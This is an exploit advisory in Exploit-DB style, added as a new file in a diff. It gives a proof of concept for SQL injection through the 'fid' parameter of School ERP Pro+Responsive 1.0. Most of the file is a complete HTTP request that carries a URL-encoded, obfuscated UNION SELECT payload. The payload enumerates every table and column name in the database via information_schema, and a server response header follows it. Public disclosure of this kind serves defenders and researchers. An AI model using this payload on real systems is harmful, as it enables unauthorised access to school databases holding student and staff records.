@@ -1,0 +1,34 @@
+# Exploit Title: School ERP Pro+Responsive 1.0 - 'fid' SQL Injection
+# Dork: N/A
+# Date: 2018-10-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.arox.in/
+# Software Link: https://sourceforge.net/projects/school-management-system-php/files/latest/download
+# Software Link: http://erp.arox.in/ http://erp1.arox.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/student_staff/?pid=54&action=staff_timetable&fid=[SQL]
+
+GET /[PATH]/student_staff/?pid=54&action=staff_timetable&fid=-%31%20%75%6e%49%6f%4e%20%73%45%6c%45%63%74%20%31%2c(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)%2c%33%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=nno01rkuj0ql0k1sb96uhg1va1
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Tue, 23 Oct 2018 12:11:18 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 68790
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
